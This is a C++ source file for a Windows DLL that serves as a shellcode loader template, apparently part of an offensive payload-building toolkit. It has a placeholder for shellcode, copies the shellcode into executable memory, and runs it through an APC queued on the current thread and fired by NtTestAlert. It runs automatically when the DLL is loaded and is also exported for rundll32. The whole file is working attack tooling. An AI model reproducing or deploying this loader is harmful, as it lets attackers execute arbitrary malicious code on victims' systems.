/**
Editor: Thomas X Meng
***/

#include <windows.h>
#include <cstdio>

#pragma comment(lib, "ntdll")
using myNtTestAlert = NTSTATUS(NTAPI*)();

unsigned char magiccode[] = ####SHELLCODE####;


// Exporting a function that can be called by rundll32.exe
extern "C" __declspec(dllexport) void CALLBACK ExecuteMagiccode(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {


    /// Here is for all the options Boaz have
    // MessageBoxA(NULL, "Hello from DllMain! Before other code", "DllMain", MB_OK);
    myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
    SIZE_T magicSize = sizeof(magiccode);
    LPVOID magicAddress = VirtualAlloc(NULL, magicSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (magicAddress == NULL) {
        printf("[-] VirtualAlloc failed.\n");
        return;
    }

    BOOL writeResult = WriteProcessMemory(GetCurrentProcess(), magicAddress, magiccode, magicSize, NULL);
    if (!writeResult) {
        printf("[-] WriteProcessMemory failed (%d).\n", GetLastError());
        return;
    }

    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)magicAddress;
    QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), (ULONG_PTR)0);
    testAlert();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // Optionally automatically execute upon loading the DLL.
        ExecuteMagiccode(NULL, hModule, NULL, SW_SHOW);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
